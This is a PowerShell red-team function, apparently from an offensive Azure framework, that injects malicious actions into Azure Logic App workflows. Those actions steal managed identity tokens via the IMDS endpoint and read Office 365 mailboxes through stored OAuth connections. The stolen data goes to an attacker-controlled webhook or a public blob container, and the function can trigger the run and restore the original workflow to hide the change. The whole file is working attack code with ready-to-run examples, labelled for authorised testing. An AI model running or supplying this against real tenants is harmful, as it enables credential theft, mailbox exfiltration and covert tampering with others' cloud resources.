function Invoke-LogicAppInjection {
    [CmdletBinding(
        SupportsShouldProcess,
        DefaultParameterSetName = 'Webhook'
    )]
    param (
        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true
        )]
        [Alias('id')]
        [string]$LogicAppId,

        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true
        )]
        [Alias('rg', 'resource-group')]
        [string]$ResourceGroupName,

        [Parameter(
            Mandatory = $false,
            ValueFromPipelineByPropertyName = $true
        )]
        [Alias('logic-app', 'workflow')]
        [string]$Name,

        # Attacker-controlled webhook / request bin URL.
        # The LA runtime POSTs the exfiltrated payload here.
        # Mutually exclusive with -StorageAccountName.
        [Parameter(
            Mandatory = $true,
            ParameterSetName = 'Webhook'
        )]
        [ValidateNotNullOrEmpty()]
        [Alias('webhook', 'exfil-url')]
        [string]$CallbackUrl,

        # Name of a storage account configured for public blob
        # read access. The LA's Managed Identity writes blobs
        # using MSI auth (no SAS token, no shared key).
        # The attacker retrieves blobs anonymously:
        #   GET https://<account>.blob.core.windows.net/<container>/<blob>
        # Mutually exclusive with -CallbackUrl.
        [Parameter(
            Mandatory = $true,
            ParameterSetName = 'BlobStorage'
        )]
        [Alias('storage', 'sa')]
        [string]$StorageAccountName,

        # Container in the exfil storage account. Must already
        # exist with publicAccess = Blob or Container so the
        # attacker can read blobs without a SAS token.
        # Default: blackcat-exfil
        [Parameter(
            Mandatory = $false,
            ParameterSetName = 'BlobStorage'
        )]
        [Alias('container')]
        [string]$StorageContainerName = 'blackcat-exfil',

        [Parameter(Mandatory = $false)]
        [ValidateSet('MIToken', 'ConnectorData', 'Both')]
        [string]$InjectionType = 'MIToken',

        # $connections key name (e.g. 'office365') for ConnectorData.
        # If omitted, the first connection in the workflow is used.
        [Parameter(Mandatory = $false)]
        [Alias('connection')]
        [string]$ConnectionName,

        # Connector action path for ConnectorData injection.
        # Defaults to /v2/Mail (Office 365 — list inbox).
        [Parameter(Mandatory = $false)]
        [Alias('connector-path')]
        [string]$ConnectorPath = '/v2/Mail',

        # Trigger the workflow immediately after injection
        # (works only when the LA has an HTTP/Request trigger).
        [Parameter(Mandatory = $false)]
        [switch]$TriggerWorkflow,

        # Restore the original workflow definition after triggering.
        # Waits 8 seconds to allow the injected run to complete.
        [Parameter(Mandatory = $false)]
        [switch]$Restore,

        [Parameter(Mandatory = $false)]
        [ValidateSet('Object', 'JSON', 'CSV', 'Table')]
        [Alias('output', 'o')]
        [string]$OutputFormat = 'Object'
    )

    begin {
        Write-Verbose "Starting function $($MyInvocation.MyCommand.Name)"
        $MyInvocation.MyCommand.Name | Invoke-BlackCat

        $result = New-Object System.Collections.ArrayList
        $stats  = @{
            StartTime = Get-Date
            Injected  = 0
            Triggered = 0
            Restored  = 0
            Failed    = 0
        }
    }

    process {
        try {
            $sv   = $script:SessionVariables
            $auth = $script:authHeader

            # ── Resolve Logic App resource ID(s) ─────────────────
            $laIds = @()

            if ($LogicAppId) {
                $laIds += $LogicAppId
            }
            elseif ($ResourceGroupName -and $Name) {
                $subId  = $sv.subscriptionId
                $laIds += (
                    "/subscriptions/$subId/resourceGroups/" +
                    "$ResourceGroupName/providers/" +
                    "Microsoft.Logic/workflows/$Name"
                )
            }
            else {
                Write-Host (
                    ' No Logic App targeted — ' +
                    'enumerating accessible workflows...'
                ) -ForegroundColor Cyan

                $all = Invoke-AzBatch `
                    -ResourceType 'Microsoft.Logic/workflows'

                if (-not $all -or $all.Count -eq 0) {
                    Write-Host '  No Logic Apps found' `
                        -ForegroundColor Yellow
                    return
                }

                $laIds = $all.id
                Write-Host (
                    "  Found $($laIds.Count) Logic App(s)"
                ) -ForegroundColor Cyan
            }

            foreach ($laId in $laIds) {
                $laName = ($laId -split '/')[-1]
                $laRg   = ($laId -split '/')[4]
                $sub    = ($laId -split '/')[2]

                try {
                    Write-Host (
                        " [$laName] Fetching workflow definition..."
                    ) -ForegroundColor Cyan

                    # GET current workflow definition
                    $getUri = (
                        '{0}{1}?api-version=2019-05-01'
                    ) -f $sv.armUri, $laId

                    $la = Invoke-RestMethod `
                        -Uri       $getUri `
                        -Headers   $auth `
                        -Method    'GET' `
                        -UserAgent $sv.userAgent

                    # Snapshot for optional restore
                    $originalJson = $la |
                        ConvertTo-Json -Depth 50 -Compress

                    $definition = $la.properties.definition
                    $actions    = $definition.actions

                    # Ensure actions property exists on definition
                    if (-not $actions) {
                        $definition | Add-Member `
                            -MemberType NoteProperty `
                            -Name  'actions' `
                            -Value ([PSCustomObject]@{}) `
                            -Force
                        $actions = $definition.actions
                    }

                    $existing = (
                        $actions.PSObject.Properties.Name -join ', '
                    )
                    Write-Host (
                        "   Existing actions: $existing"
                    ) -ForegroundColor White

                    # ── Exfil action builder ─────────────────────
                    # Returns a PUT-blob or POST-webhook action
                    # depending on which parameter set is active.
                    # Must be invoked after $laName is resolved.
                    $buildExfil = {
                        param(
                            [string]$SourceAction,
                            [string]$Label
                        )
                        if ($StorageAccountName) {
                            # Blob name built via LA expression so
                            # each run produces a unique file:
                            # <label>-<laname>-<yyyyMMddHHmmss>.json
                            $blobName = (
                                "@{concat('$Label-'," +
                                " workflow().name, '-'," +
                                " utcNow('yyyyMMddHHmmss')," +
                                " '.json')}"
                            )
                            $blobUri = (
                                "https://$StorageAccountName" +
                                '.blob.core.windows.net' +
                                "/$StorageContainerName/" +
                                $blobName
                            )
                            @{
                                type   = 'Http'
                                inputs = @{
                                    method  = 'PUT'
                                    uri     = $blobUri
                                    headers = @{
                                        'x-ms-blob-type' =
                                            'BlockBlob'
                                        'Content-Type'   =
                                            'application/json'
                                        'x-ms-version'   =
                                            '2021-06-08'
                                    }
                                    body           = (
                                        "@body('$SourceAction')"
                                    )
                                    authentication = @{
                                        type     =
                                            'ManagedServiceIdentity'
                                        audience =
                                            'https://storage.azure.com/'
                                    }
                                }
                                runAfter = @{
                                    $SourceAction = @(
                                        'Succeeded',
                                        'Failed',
                                        'TimedOut',
                                        'Skipped'
                                    )
                                }
                            }
                        }
                        else {
                            @{
                                type   = 'Http'
                                inputs = @{
                                    method  = 'POST'
                                    uri     = $CallbackUrl
                                    headers = @{
                                        'Content-Type' =
                                            'application/json'
                                        'X-LA-Name' = $laName
                                        'X-Label'   = $Label
                                    }
                                    body = "@body('$SourceAction')"
                                }
                                runAfter = @{
                                    $SourceAction = @(
                                        'Succeeded',
                                        'Failed',
                                        'TimedOut',
                                        'Skipped'
                                    )
                                }
                            }
                        }
                    }

                    # Exfil target for console/result output
                    $exfilTarget = if ($StorageAccountName) {
                        "https://$StorageAccountName" +
                        ".blob.core.windows.net" +
                        "/$StorageContainerName/"
                    } else { $CallbackUrl }

                    # ── Build injection chain ─────────────────────
                    # Actions are stored as ordered dict to preserve
                    # the dependency chain across InjectionTypes.
                    $injected   = [ordered]@{}
                    $lastAction = $null

                    if ($InjectionType -in 'MIToken', 'Both') {
                        # HTTP action: fetch IMDS token.
                        # Accessible from within the LA runtime when
                        # a managed identity is assigned to the LA.
                        # runAfter {} means it fires at workflow start
                        # (parallel with existing root actions).
                        $imdsUrl = (
                            'http://169.254.169.254/metadata/' +
                            'identity/oauth2/token' +
                            '?api-version=2018-02-01' +
                            '&resource=https://' +
                            'management.azure.com/'
                        )

                        $fetchName = 'BlackCat_FetchIMDSToken'
                        $injected[$fetchName] = @{
                            type     = 'Http'
                            inputs   = @{
                                method  = 'GET'
                                uri     = $imdsUrl
                                headers = @{ Metadata = 'true' }
                            }
                            runAfter = @{}
                        }

                        # Exfil: PUT blob via MI or POST to webhook.
                        # Fires regardless of fetch outcome so both
                        # MI token responses and IMDS error bodies
                        # (e.g. ManagedIdentityIsNotEnabled) are
                        # captured.
                        $exfilName = 'BlackCat_ExfilToken'
                        $injected[$exfilName] = & $buildExfil `
                            $fetchName 'token'

                        $lastAction = $exfilName
                        Write-Host (
                            '   Injecting MI/IMDS token fetch ' +
                            '+ exfil actions'
                        ) -ForegroundColor Yellow
                    }

                    if ($InjectionType -in 'ConnectorData', 'Both') {
                        # Resolve $connections key (connector name)
                        $connKey = if ($ConnectionName) {
                            $ConnectionName
                        }
                        else {
                            $connObj = $la.properties.parameters.`
                                '$connections'.value
                            if ($connObj) {
                                $connObj.PSObject.Properties.Name |
                                    Select-Object -First 1
                            } else { $null }
                        }

                        if (-not $connKey) {
                            Write-Warning (
                                "[$laName] No connection found in" +
                                ' $connections — skipping ' +
                                'ConnectorData injection'
                            )
                        }
                        else {
                            Write-Host (
                                "   Injecting connector read via" +
                                " '$connKey' → $ConnectorPath"
                            ) -ForegroundColor Yellow

                            # Logic Apps Consumption expression to
                            # reference the connection ID at runtime.
                            # backtick escapes $ in PS double-string.
                            $connRef = (
                                "@parameters('`$connections')" +
                                "['$connKey']['connectionId']"
                            )

                            $readRunAfter = if ($lastAction) {
                                @{
                                    $lastAction = @(
                                        'Succeeded',
                                        'Failed',
                                        'TimedOut',
                                        'Skipped'
                                    )
                                }
                            } else { @{} }

                            $readName = 'BlackCat_ConnectorRead'
                            $injected[$readName] = @{
                                type   = 'ApiConnection'
                                inputs = @{
                                    host = @{
                                        connection = @{
                                            name = $connRef
                                        }
                                    }
                                    method  = 'get'
                                    path    = $ConnectorPath
                                    queries = @{
                                        fetchOnlyUnread = $false
                                        top             = 10
                                    }
                                }
                                runAfter = $readRunAfter
                            }

                            $lastAction    = $readName
                            $dataExfilName = 'BlackCat_ExfilData'
                            $injected[$dataExfilName] = & $buildExfil `
                                $readName 'data'
                        }
                    }

                    if ($injected.Count -eq 0) {
                        Write-Warning (
                            "[$laName] Nothing to inject"
                        )
                        continue
                    }

                    # Merge injected actions into $actions PSObject.
                    # Add-Member -Force overwrites if already present
                    # (idempotent re-injection).
                    foreach ($k in $injected.Keys) {
                        $actions | Add-Member `
                            -MemberType NoteProperty `
                            -Name  $k `
                            -Value (
                                [PSCustomObject]($injected[$k])
                            ) `
                            -Force
                    }

                    if (-not $PSCmdlet.ShouldProcess(
                        $laName,
                        'Inject HTTP actions into workflow definition'
                    )) { continue }

                    # PUT modified workflow back to ARM
                    $putUri  = (
                        '{0}{1}?api-version=2019-05-01'
                    ) -f $sv.armUri, $laId

                    $putBody = $la |
                        ConvertTo-Json -Depth 50 -Compress

                    Invoke-RestMethod `
                        -Uri         $putUri `
                        -Headers     $auth `
                        -Method      'PUT' `
                        -Body        $putBody `
                        -ContentType 'application/json' `
                        -UserAgent   $sv.userAgent | Out-Null

                    $stats.Injected++
                    Write-Host (
                        "  [+] Injected $($injected.Count)" +
                        " action(s) into [$laName]"
                    ) -ForegroundColor Red
                    Write-Host (
                        "      Actions: " +
                        "$($injected.Keys -join ', ')"
                    ) -ForegroundColor Red
                    $exfilMode = if ($StorageAccountName) {
                        "Blob PUT (MI auth) → $exfilTarget"
                    } else { "Webhook POST → $exfilTarget" }
                    Write-Host (
                        "      Exfil target: $exfilMode"
                    ) -ForegroundColor DarkGray

                    # ── Trigger ───────────────────────────────────
                    $triggered   = $false
                    $triggerName = $null

                    if ($TriggerWorkflow) {
                        $triggers = $definition.triggers
                        $httpTrig = $triggers.PSObject.Properties |
                            Where-Object {
                                $_.Value.type -eq 'Request' -or
                                $_.Value.kind -eq 'Http'
                            } | Select-Object -First 1

                        if ($httpTrig) {
                            $triggerName = $httpTrig.Name
                            $cbUri = (
                                '{0}{1}/triggers/{2}' +
                                '/listCallbackUrl' +
                                '?api-version=2019-05-01'
                            ) -f $sv.armUri, $laId, $triggerName

                            $cb = Invoke-RestMethod `
                                -Uri       $cbUri `
                                -Headers   $auth `
                                -Method    'POST' `
                                -UserAgent $sv.userAgent

                            Invoke-RestMethod `
                                -Uri    $cb.value `
                                -Method 'POST' | Out-Null

                            $triggered = $true
                            $stats.Triggered++
                            Write-Host (
                                "  [>] Triggered [$laName] via" +
                                " trigger '$triggerName'"
                            ) -ForegroundColor Yellow
                        }
                        else {
                            Write-Host (
                                "  [!] [$laName] No HTTP/Request" +
                                ' trigger found — trigger manually' +
                                ' or wait for scheduled run'
                            ) -ForegroundColor DarkYellow
                        }
                    }

                    # ── Restore ───────────────────────────────────
                    $restored = $false

                    if ($Restore) {
                        if ($triggered) {
                            Write-Host (
                                '  [.] Waiting 8s for run to' +
                                ' complete before restore...'
                            ) -ForegroundColor DarkGray
                            Start-Sleep -Seconds 8
                        }

                        Invoke-RestMethod `
                            -Uri         $putUri `
                            -Headers     $auth `
                            -Method      'PUT' `
                            -Body        $originalJson `
                            -ContentType 'application/json' `
                            -UserAgent   $sv.userAgent | Out-Null

                        $restored = $true
                        $stats.Restored++
                        Write-Host (
                            "  [~] [$laName] Original definition" +
                            ' restored'
                        ) -ForegroundColor Cyan
                    }

                    [void]$result.Add([PSCustomObject]@{
                        'LogicAppName'    = $laName
                        'LogicAppId'      = $laId
                        'ResourceGroup'   = $laRg
                        'InjectedActions' = (
                            $injected.Keys -join ', '
                        )
                        'ExfilTarget'     = $exfilTarget
                        'ExfilMode'       = if ($StorageAccountName) {
                            'BlobStorage'
                        } else { 'Webhook' }
                        'Triggered'       = $triggered
                        'TriggerName'     = $triggerName
                        'Restored'        = $restored
                    })
                }
                catch {
                    $errMsg = $_.Exception.Message
                    Write-Warning "[$laName] $errMsg"
                    $stats.Failed++
                }
            }
        }
        catch {
            Write-Message `
                -FunctionName $($MyInvocation.MyCommand.Name) `
                -Message      $($_.Exception.Message) `
                -Severity     'Error'
        }
    }

    end {
        $duration = (Get-Date) - $stats.StartTime

        Write-Host "`n Logic App Injection Summary:" `
            -ForegroundColor Magenta
        Write-Host "   Injected  : $($stats.Injected)" `
            -ForegroundColor Red
        Write-Host "   Triggered : $($stats.Triggered)" `
            -ForegroundColor Yellow
        Write-Host "   Restored  : $($stats.Restored)" `
            -ForegroundColor Cyan
        Write-Host "   Failed    : $($stats.Failed)" `
            -ForegroundColor Red
        Write-Host (
            "   Duration  : " +
            "$($duration.TotalSeconds.ToString('F2'))s"
        ) -ForegroundColor White

        Write-Verbose "Completed function $($MyInvocation.MyCommand.Name)"

        Format-BlackCatOutput `
            -Data         $result `
            -OutputFormat $OutputFormat `
            -FunctionName $MyInvocation.MyCommand.Name
    }

    <#
    .SYNOPSIS
        Injects HTTP actions into a Logic App workflow definition.

    .DESCRIPTION
        Modifies a Logic App workflow definition by injecting two
        categories of actions:

        MIToken (default):
          Injects BlackCat_FetchIMDSToken and BlackCat_ExfilToken.
          BlackCat_FetchIMDSToken calls the Azure IMDS endpoint from
          within the Logic App runtime:
            http://169.254.169.254/metadata/identity/oauth2/token
          If a Managed Identity is assigned to the Logic App, IMDS
          returns an ARM Bearer token. The result (token or error
          body) is POSTed to -CallbackUrl by BlackCat_ExfilToken.

        ConnectorData:
          Injects BlackCat_ConnectorRead and BlackCat_ExfilData.
          BlackCat_ConnectorRead executes a connector action (e.g.
          GET /v2/Mail) as the OAuth-consented user — the Logic Apps
          runtime uses the stored OAuth refresh token transparently.
          The connector response is POSTed to -CallbackUrl.

        Both:
          All four actions are injected as a sequential chain:
          IMDS fetch → IMDS exfil → connector read → data exfil.

        Injected actions run in parallel with existing root actions
        (runAfter: {}) so the Logic App's original functionality
        continues uninterrupted.

        Use -TriggerWorkflow to fire an HTTP-triggered Logic App
        immediately. Use -Restore to PUT back the original definition
        after the run (waits 8 seconds for completion).

        AUTHORISED SECURITY TESTING ONLY.
        Required RBAC actions:
          Microsoft.Logic/workflows/read
          Microsoft.Logic/workflows/write
          Microsoft.Logic/workflows/triggers/listCallbackUrl/action
            (for -TriggerWorkflow)

    .PARAMETER LogicAppId
        Full ARM resource ID of the target Logic App.

    .PARAMETER ResourceGroupName
        Resource group of the target Logic App. Use with -Name.

    .PARAMETER Name
        Name of the target Logic App. Use with -ResourceGroupName.

    .PARAMETER CallbackUrl
        Attacker-controlled webhook / request bin URL (e.g.
        webhook.site, ngrok). The LA runtime POSTs the exfiltrated
        payload here. Mutually exclusive with -StorageAccountName.

    .PARAMETER StorageAccountName
        Name of an Azure storage account to use as the exfil target.
        The Logic App's Managed Identity authenticates to blob storage
        using MSI auth (audience: https://storage.azure.com/) — no
        SAS token, no shared key is embedded in the workflow.
        Each exfil action PUTs a uniquely named blob:
          <label>-<laname>-<yyyyMMddHHmmss>.json
        Configure the container with publicAccess = Blob so the
        attacker can retrieve blobs anonymously:
          GET https://<account>.blob.core.windows.net/<container>/<blob>
        Requires: Storage Blob Data Contributor on the target
        container assigned to the Logic App's managed identity.
        Mutually exclusive with -CallbackUrl.

    .PARAMETER StorageContainerName
        Container name in the exfil storage account.
        Default: blackcat-exfil

    .PARAMETER InjectionType
        MIToken (default): inject IMDS token fetch + exfil.
        ConnectorData: inject connector read + exfil.
        Both: inject the full four-action chain.

    .PARAMETER ConnectionName
        The $connections key name (e.g. "office365") to use for
        ConnectorData injection. If omitted, the first connection
        found in the workflow is used.

    .PARAMETER ConnectorPath
        Connector action path for ConnectorData injection.
        Default is /v2/Mail (Office 365 list inbox).
        See the connector swagger for available paths:
        GET {armUri}/subscriptions/{sub}/providers/Microsoft.Web
        /locations/{loc}/managedApis/{connector}?api-version=2016-06-01

    .PARAMETER TriggerWorkflow
        After injection, trigger the workflow via its HTTP/Request
        trigger callback URL. If no HTTP trigger exists, a warning
        is shown and the workflow must be triggered manually.

    .PARAMETER Restore
        After triggering (or immediately if -TriggerWorkflow is not
        set), restore the original workflow definition. When combined
        with -TriggerWorkflow, waits 8 seconds first.

    .PARAMETER OutputFormat
        Output format: Object (default), JSON, CSV, Table.

    .EXAMPLE
        Invoke-LogicAppInjection `
            -Name 'api-usage-test' `
            -ResourceGroupName 'azh-development' `
            -CallbackUrl 'https://webhook.site/abc123' `
            -InjectionType MIToken `
            -TriggerWorkflow -Restore

        Injects IMDS fetch + exfil into 'api-usage-test', triggers
        it once via its HTTP trigger, then restores the original
        definition. If the LA has a system-assigned MI the callback
        receives the full ARM Bearer token as JSON.

    .EXAMPLE
        Invoke-LogicAppInjection `
            -Name 'api-usage-test' `
            -ResourceGroupName 'azh-development' `
            -CallbackUrl 'https://webhook.site/abc123' `
            -InjectionType ConnectorData `
            -ConnectionName 'office365' `
            -ConnectorPath '/v2/Mail' `
            -TriggerWorkflow -Restore

        Injects connector read for the office365 connection. When
        the workflow runs, BlackCat_ConnectorRead reads up to 10
        emails as the OAuth-consented user and POSTs them to the
        callback. The original workflow is restored after 8s.

    .EXAMPLE
        Invoke-LogicAppInjection `
            -Name 'api-usage-test' `
            -ResourceGroupName 'azh-development' `
            -CallbackUrl 'https://webhook.site/abc123' `
            -InjectionType Both

        Injects all four actions. Does NOT trigger or restore — call
        with -TriggerWorkflow and -Restore as needed. Useful to
        stage the injection first and inspect before triggering.

    .EXAMPLE
        # Pre-requisites for BlobStorage mode:
        # 1. Storage account with allowBlobPublicAccess = true
        # 2. Container 'blackcat-exfil' with publicAccess = Blob
        # 3. Logic App MI has Storage Blob Data Contributor
        #    on the container (or storage account)

        Invoke-LogicAppInjection `
            -Name 'api-usage-test' `
            -ResourceGroupName 'azh-development' `
            -StorageAccountName 'bcatexfilsa' `
            -StorageContainerName 'blackcat-exfil' `
            -InjectionType MIToken `
            -TriggerWorkflow -Restore

        # Retrieve exfiltrated blob without any token:
        Invoke-RestMethod `
            -Uri 'https://bcatexfilsa.blob.core.windows.net/blackcat-exfil/' `
            -Method GET
        # List blobs, then fetch the one matching your LA name:
        # GET https://bcatexfilsa.blob.core.windows.net/blackcat-exfil/<blobname>

    .EXAMPLE
        Get-ApiConnection -MinRiskLevel High |
            Invoke-LogicAppInjection `
                -CallbackUrl 'https://webhook.site/abc123' `
                -InjectionType ConnectorData `
                -TriggerWorkflow -Restore

        Pipes high-risk API connections through to injection.
        (Note: Get-ApiConnection returns connection objects; pipe
        through Get-ApiConnectionToken -ResolveManagedIdentity to
        get Logic App names first if needed.)

    .OUTPUTS
        [PSCustomObject]
        Returns objects with properties:
        - LogicAppName: Name of the modified Logic App
        - LogicAppId: Full ARM resource ID
        - ResourceGroup: Containing resource group
        - InjectedActions: Comma-separated injected action names
        - ExfilTarget: Storage container URL or webhook URL
        - ExfilMode: BlobStorage or Webhook
        - Triggered: Whether the workflow was triggered
        - TriggerName: Name of the HTTP trigger used
        - Restored: Whether the original definition was restored

    .NOTES
        Author: BlackCat Security Framework
        Requires: ARM access (Az.Accounts)

        The IMDS endpoint is reachable from within Logic Apps
        Consumption and Standard tier runtimes when a Managed
        Identity is configured. Without an MI, IMDS returns 400
        (ManagedIdentityIsNotEnabled) — this error response is
        still exfiltrated so absence of MI is confirmed.

        For OAuth-User connections (office365, teams etc.),
        ConnectorData injection works because the Logic Apps runtime
        has access to the stored OAuth refresh token. The raw token
        is never returned — connector API responses are returned.

        Actions are injected with runAfter:{} so they run alongside
        (not instead of) existing root actions. The LA continues to
        function normally during the injected run.

        BlobStorage mode (-StorageAccountName):
          The exfil action uses ManagedServiceIdentity authentication
          with audience https://storage.azure.com/ — the LA's own MI
          writes the blob. No SAS token or shared key is embedded in
          the workflow definition.
          Blob name pattern (Logic Apps expression):
            @{concat('<label>-', workflow().name, '-',
              utcNow('yyyyMMddHHmmss'), '.json')}
          Requires the LA's MI to have Storage Blob Data Contributor
          on the target container. Configure the container with
          publicAccess = Blob for anonymous read.

    .LINK
        MITRE ATT&CK Tactic: TA0006 - Credential Access
        https://attack.mitre.org/tactics/TA0006/

    .LINK
        MITRE ATT&CK Technique: T1528 - Steal Application Access Token
        https://attack.mitre.org/techniques/T1528/

    .LINK
        MITRE ATT&CK Technique: T1565.001 - Stored Data Manipulation
        https://attack.mitre.org/techniques/T1565/001/
    #>
}
